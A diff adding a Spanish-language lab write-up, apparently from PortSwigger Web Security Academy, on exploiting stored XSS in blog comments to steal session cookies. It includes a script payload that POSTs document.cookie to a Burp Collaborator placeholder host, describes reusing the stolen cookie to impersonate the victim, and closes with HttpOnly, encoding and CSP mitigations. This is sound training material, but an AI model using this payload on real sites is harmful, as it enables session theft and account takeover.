@@ -225,3 +225,59 @@ La aplicación debe evitar insertar directamente datos controlados por el usuari
 También es recomendable utilizar una **Content Security Policy (CSP)** como capa adicional de defensa, aunque no sustituye el correcto tratamiento de los datos.
 
 Referencia: [PortSwigger Web Security Academy – XSS contexts](https://portswigger.net/web-security/cross-site-scripting/contexts)
+
+## Cross-Site Scripting - Stored XSS - Stealing Cookies
+
+**Descripción:** Explotar una Stored XSS para obtener la cookie de sesión de otro usuario y utilizarla para acceder a su sesión.
+
+**Objetivo**
+
+El objetivo del laboratorio es explotar una vulnerabilidad de Cross-Site Scripting para robar la cookie de sesión de un usuario mediante Burp Collaborator y utilizarla para acceder a su cuenta.
+
+**Análisis**
+
+El punto vulnerable se encuentra en los comentarios de una publicación del blog, donde es posible almacenar contenido que posteriormente será procesado por el navegador de otro usuario.
+
+Utilicé el siguiente payload:
+
+```html
+<script>
+fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
+    method: 'POST',
+    mode: 'no-cors',
+    body: document.cookie
+});
+</script>
+```
+
+El código utiliza `document.cookie` para obtener las cookies accesibles mediante JavaScript y `fetch()` para enviarlas mediante una petición POST al servidor de Burp Collaborator.
+
+![](./images/PSXSSC1.png)
+
+Después de publicar el comentario, esperé la interacción del usuario víctima con el contenido. Burp Collaborator recibió una petición HTTP cuyo contenido incluía una cookie de sesión.
+
+![](./images/PSXSSC2.png)
+
+La cookie obtenida contenía el identificador de sesión del usuario víctima. Para comprobar su utilidad, tomé una petición realizada al sitio desde el navegador y la envié a Repeater, reemplazando el valor de mi cookie `session` por el valor obtenido mediante la XSS.
+
+![](./images/PSXSSC3.png)
+
+Al enviar la petición, el servidor la procesó utilizando la sesión asociada a la cookie robada y el laboratorio fue marcado como resuelto.
+
+**Resultado**
+
+Fue posible explotar una Stored XSS para exfiltrar la cookie de sesión de otro usuario y utilizarla para realizar una petición autenticada como esa víctima.
+
+El ataque demuestra que una XSS puede utilizarse no solo para ejecutar JavaScript en el navegador de otro usuario, sino también para comprometer su sesión cuando las cookies de autenticación son accesibles mediante JavaScript.
+
+**Mitigación**
+
+Una medida de protección frente al robo de cookies mediante JavaScript es utilizar el atributo `HttpOnly` en las cookies de sesión:
+
+```http
+Set-Cookie: session=...; HttpOnly
+```
+
+De esta forma, la cookie continúa siendo enviada automáticamente en las peticiones correspondientes, pero no puede ser accedida mediante `document.cookie`.
+
+Esta medida debe complementarse con las mitigaciones propias de XSS, principalmente realizar un correcto output encoding según el contexto y utilizar una Content Security Policy (CSP) adecuada.
